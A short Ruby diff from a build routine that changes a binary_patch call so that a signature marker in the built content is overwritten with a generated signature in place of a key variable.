@@ -112,7 +112,7 @@ class Build
     begin
       sign = ::Signature.where({scope: 'agent'}).first
       signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
-      content.binary_patch 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', key
+      content.binary_patch 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
     rescue
       raise "Signature marker not found"
     end
